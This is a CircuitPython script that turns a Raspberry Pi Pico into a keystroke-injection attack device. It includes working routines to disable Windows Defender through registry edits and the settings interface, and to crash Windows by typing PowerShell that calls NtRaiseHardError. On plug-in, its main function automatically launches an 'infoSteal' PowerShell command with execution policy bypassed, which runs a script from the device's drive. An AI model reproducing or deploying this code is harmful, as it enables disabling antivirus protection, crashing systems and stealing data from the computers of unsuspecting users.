# Auto Reload Main- ---------------------------------------------
AutoReload = False
import supervisor
supervisor.runtime.autoreload = AutoReload

# Imports -------------------------------------------------------

import time
import usb_hid # type: ignore
import random
import digitalio
import board
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayout
from adafruit_hid.mouse import Mouse
from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.consumer_control_code import ConsumerControlCode
import storage

# Variables -----------------------------------------------------

led = digitalio.DigitalInOut(board.LED)
gpio2 = digitalio.DigitalInOut(board.GP2)
gpio3 = digitalio.DigitalInOut(board.GP3)

led.direction = digitalio.Direction.OUTPUT
gpio2.direction = digitalio.Direction.OUTPUT

kbd = Keyboard(usb_hid.devices)
cc = ConsumerControl(usb_hid.devices)
kbdl = KeyboardLayout(kbd)
mouse = Mouse(usb_hid.devices)

picoName = "CIRCUITPY"

gpio2.value = True 

# Random Additions ----------------------------------------------

def remount(readOnly=False):
    storage.remount("/", readonly=readOnly)

def Sleep(duration=0.1):
    time.sleep(duration)

def RanNum(min, max):
    return random.randint(min, max)

# Mouse funcs ---------------------------------------------------
def scrollMouse(y):
    mouse.move(wheel=y)
    
def setMousePos(x, y):
    mouse.move(x=x, y=y)

def MoveMouse(dx, dy):
    mouse.move(x=dx, y=dy)

def ClickMouse(button=Mouse.LEFT_BUTTON):
    mouse.click(button)
    
def ReleaseMouse(button=Mouse.LEFT_BUTTON):
    mouse.release(button)
    
def holdReleaseMouse(button=Mouse.LEFT_BUTTON, duration=None):
    ClickMouse(button)
    if duration:
        time.sleep(duration)
        ReleaseMouse(button)
    else:
        pass
        
# Key Maps -------------------------------------------------------


KEY_MAP = {
    "win": (Keycode.GUI,),"gui": (Keycode.GUI,), "enter": (Keycode.ENTER,), "space": (Keycode.SPACEBAR,),
    "lshift": (Keycode.LEFT_SHIFT,), "rshift": (Keycode.RIGHT_SHIFT,), "shift": (Keycode.LEFT_SHIFT,),
    "lctrl": (Keycode.LEFT_CONTROL,), "rctrl": (Keycode.RIGHT_CONTROL,), "ctrl": (Keycode.LEFT_CONTROL,),
    "lalt": (Keycode.LEFT_ALT,), "ralt": (Keycode.RIGHT_ALT,), "alt": (Keycode.LEFT_ALT,),
    "tab": (Keycode.TAB,), "esc": (Keycode.ESCAPE,), "escape": (Keycode.ESCAPE,),
    "backspace": (Keycode.BACKSPACE,), "delete": (Keycode.DELETE,), "del": (Keycode.DELETE,),
    "left": (Keycode.LEFT_ARROW,), "right": (Keycode.RIGHT_ARROW,), "up": (Keycode.UP_ARROW,),
    "down": (Keycode.DOWN_ARROW,), "f1": (Keycode.F1,), "f2": (Keycode.F2,), "f3": (Keycode.F3,),
    "f4": (Keycode.F4,), "f5": (Keycode.F5,), "f6": (Keycode.F6,), "f7": (Keycode.F7,), "f8": (Keycode.F8,),
    "f9": (Keycode.F9,), "f10": (Keycode.F10,), "f11": (Keycode.F11,), "f12": (Keycode.F12,),
    "capslock": (Keycode.CAPS_LOCK,), "caps": (Keycode.CAPS_LOCK,),
    "printscreen": (Keycode.PRINT_SCREEN,), "prntscrn": (Keycode.PRINT_SCREEN,),
    "scrolllock": (Keycode.SCROLL_LOCK,), "pause": (Keycode.PAUSE,), "insert": (Keycode.INSERT,),
    "ins": (Keycode.INSERT,), "home": (Keycode.HOME,), "end": (Keycode.END,), "pageup": (Keycode.PAGE_UP,),
    "pagedown": (Keycode.PAGE_DOWN,), "pgup": (Keycode.PAGE_UP,), "pgdn": (Keycode.PAGE_DOWN,),
    "app": (Keycode.APPLICATION,),"application": (Keycode.APPLICATION,),"menu": (Keycode.APPLICATION,),
    "newline": (Keycode.SHIFT, Keycode.ENTER,), "nl": (Keycode.SHIFT, Keycode.ENTER,),
}

CC_MAP = {
    "play": (ConsumerControlCode.PLAY_PAUSE,), "pause": (ConsumerControlCode.PLAY_PAUSE,),
    "stop": (ConsumerControlCode.STOP,), "next": (ConsumerControlCode.SCAN_NEXT_TRACK,),
    "prev": (ConsumerControlCode.SCAN_PREVIOUS_TRACK,), "previous": (ConsumerControlCode.SCAN_PREVIOUS_TRACK,),
    "forward": (ConsumerControlCode.FAST_FORWARD,), "rewind": (ConsumerControlCode.REWIND,),
    "record": (ConsumerControlCode.RECORD,), "eject": (ConsumerControlCode.EJECT,),
    
    "volup": (ConsumerControlCode.VOLUME_INCREMENT,), "volumeup": (ConsumerControlCode.VOLUME_INCREMENT,),
    "voldown": (ConsumerControlCode.VOLUME_DECREMENT,), "volumedown": (ConsumerControlCode.VOLUME_DECREMENT,),
    "mute": (ConsumerControlCode.MUTE,),

    "brightnessup": (ConsumerControlCode.BRIGHTNESS_INCREMENT,), "brightup": (ConsumerControlCode.BRIGHTNESS_INCREMENT,),
    "brightnessdown": (ConsumerControlCode.BRIGHTNESS_DECREMENT,), "brightdown": (ConsumerControlCode.BRIGHTNESS_DECREMENT,)
}


# Keyboard funcs ------------------------------------------------

def relAllKeys():
    kbd.release_all()

def getKeycode(dk):
    try:
        return kbdl.keycodes(dk)
    except:
        k = dk.lower()
        if k in KEY_MAP:
            return KEY_MAP[k]
        elif k in CC_MAP:
            return CC_MAP[k]
        else:
            return None

def pressKey(k):
    dk = getKeycode(k)
    if dk:
        for i in dk:
            kbd.press(i)

def releaseKey(k):
    dk = getKeycode(k)
    if dk:
        for i in dk:
            kbd.release(i)
    
def writeKeys(text, delay=0):
    for char in text:
        pressKey(char)
        Sleep(delay)
        releaseKey(char)
    Sleep(delay)
    
def sendKeys(t,ed=.1, td=0):
    writeKeys(t, td)
    Sleep(ed)
    pressReleaseKey("enter")
    
def pressReleaseKeys(k="ctrl", dk="v", delay=.1):
    try:
        pressKey(k)
        pressKey(dk)
        Sleep(delay)
        releaseKey(dk)
        releaseKey(k)
    except Exception as e:
        # Emergency key release if something goes wrong
        print(f"Error in pressReleaseKeys: {e}")
        relAllKeys()
    
def pressReleaseKey(k="enter", delay=.1):
    try:
        if k in CC_MAP:
            dk = getKeycode(k)
            for i in dk:
                cc.send(i)
        else:
            pressKey(k)
            Sleep(delay)
            releaseKey(k)
    except Exception as e:
        # Emergency key release if something goes wrong
        print(f"Error in pressReleaseKey: {e}")
        relAllKeys()

    
# Useful Additions -------------------------------------------

# ----Mouse --------------------------------------------------

def CrazyMouseTP(duration=10,delay=0):
    start_time = time.time()
    while time.time() - start_time < duration:
        setMousePos(RanNum(-1000, 1000), RanNum(-1000, 1000))
        time.sleep(delay)

def CrazyMouseMove(intensity=5, duration=10,delay=0):
    start_time = time.time()
    while time.time() - start_time < duration:
        MoveMouse(RanNum(intensity * -1, intensity), RanNum(intensity * -1, intensity))
        time.sleep(delay)
        
# ---- Keyboard ----------------------------------------------

def winr(app="powershell",d=.2):
    pressReleaseKeys("win", "r")
    Sleep(d)
    sendKeys(app, d)
    
def altf4():
    pressReleaseKeys("alt", "f4")
    
def securitymenu(d):
    pressKey("ctrl")
    pressKey("alt")
    pressKey("delete")
    Sleep(d)
    releaseKey("ctrl")
    releaseKey("alt")
    releaseKey("delete")
    
def taskmgr(d=.1):
    pressKey("ctrl")
    pressKey("shift")
    pressKey("esc")
    Sleep(d)
    releaseKey("ctrl")
    releaseKey("shift")
    releaseKey("esc")
    
def regedit(d=.5):
    winr("regedit", d)
    Sleep(d)
    enableAdminPriv()
    
def lockscrn(d=.1):
    pressReleaseKeys("win", "l", d)
    
def winSettings(d=.1):
    pressReleaseKeys("win", "i", d)
    
def enableAdminPriv(d=.2):
    pressReleaseKey("left")
    Sleep(d)
    pressReleaseKey("enter")
    
def openRegPath(reg="HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender",d=2):
    regedit()
    Sleep(d)
    pressReleaseKey("tab")
    Sleep()
    pressReleaseKey("tab")
    Sleep()
    sendKeys(reg,ed=.2)
    
def changeRegVal(type="dword", name="DisableScanOnRealtimeEnable", value=1, goToKey=True):
    v = str(value)
    t = type[0].lower()
    pressReleaseKey("app")
    Sleep()
    sendKeys("n" + t + name, ed=.2)
    Sleep()
    if t != "k":
        pressReleaseKey("app")
        Sleep()
        sendKeys("m" + v)
        if goToKey:
            pressReleaseKey("tab")
            Sleep()
            pressReleaseKey("tab")
    else:
        pass
        
def toggleWin11Defen(d=2,c=True):
    pressReleaseKey("win")
    Sleep(.3)
    sendKeys("windows security")
    Sleep(d) # load delay
    pressReleaseKey("enter")
    Sleep(.2)
    pressReleaseKey("tab")
    Sleep()
    pressReleaseKey("tab")
    Sleep()
    pressReleaseKey("tab")
    Sleep()
    pressReleaseKey("tab")
    Sleep()
    pressReleaseKey("enter")
    Sleep(.3)
    pressReleaseKey(" ")
    Sleep(.4)
    enableAdminPriv()
    Sleep(.2)
    if c:
        altf4()
    else:
        pass
    
def permenentDisableWinDefen():
    
    openRegPath()
    Sleep(.5)
    changeRegVal(name="DisableAntiSpyware")
    Sleep(.5)
    changeRegVal("key","Real-Time Protection")
    Sleep(.5)
    changeRegVal(name="DisableBehaviorMonitoring")
    Sleep(.5)
    changeRegVal(name="DisableOnAccessProtection")
    Sleep(.5)
    changeRegVal(name="DisableScanOnRealtimeEnable",goToKey=False)
    Sleep(.3)
    pressKey("alt")
    pressKey("f")
    pressKey("x")
    Sleep(.3)
    releaseKey("alt")
    releaseKey("f")
    releaseKey("x")
    
def bsod(): 

    winr()
    Sleep(2)
    writeKeys('Add-Type -TypeDefinition @"')
    pressReleaseKey("nl")
    writeKeys('using System;')
    pressReleaseKey("nl")
    writeKeys('using System.Runtime.InteropServices;')
    pressReleaseKey("nl")
    writeKeys('public class NativeMethods {')
    pressReleaseKey("nl")
    writeKeys('[DllImport("ntdll.dll", SetLastError = true)]')
    pressReleaseKey("nl")
    writeKeys('public static extern int RtlAdjustPrivilege(')
    pressReleaseKey("nl")
    writeKeys('int Privilege, bool Enable, bool CurrentThread, out bool Enabled')
    pressReleaseKey("nl")
    writeKeys(');')
    pressReleaseKey("nl")
    writeKeys('[DllImport("ntdll.dll", SetLastError = true)]')
    pressReleaseKey("nl")
    writeKeys('public static extern int NtRaiseHardError(')
    pressReleaseKey("nl")
    writeKeys('int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask,')
    pressReleaseKey("nl")
    writeKeys('IntPtr Parameters, int ValidResponseOption, out int Response')
    pressReleaseKey("nl")
    writeKeys(');')
    pressReleaseKey("nl")
    writeKeys('}')
    pressReleaseKey("nl")
    writeKeys('"@')
    writeKeys('\n[bool]$enabled = $false\n[NativeMethods]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled)\n[int]$response = 0\n[NativeMethods]::NtRaiseHardError(0xC0000420, 0, 0, [IntPtr]::Zero, 6, [ref]$response)\n')
    
def infoSteal():
    try:
        pressReleaseKeys("win", "r")
        Sleep(1.5)
        sendKeys('powershell -ExecutionPolicy Bypass -Command "$v=Get-Volume|?{$_.FileSystemLabel -eq \'' + picoName + '\'};$p=$v.DriveLetter+\':\\\\is.ps1\';iex \\"& \'$p\'\\""',td=0)
    except Exception as e:
        print(f"Error in infoSteal: {e}")
        relAllKeys()
# Main Func --------------------------------------------------

def main():
    try:
        if gpio3.value == False:
            Sleep(1)
            infoSteal()
        elif gpio3.value == True:
            print("GPIO2 and GPIO3 is shorted, exiting")
    except Exception as e:
        print(f"Error in main: {e}")
    finally:
        # Always release all keys at the end to prevent stuck keys
        relAllKeys()
        Sleep(0.1)  # Small delay to ensure release is processed

main() 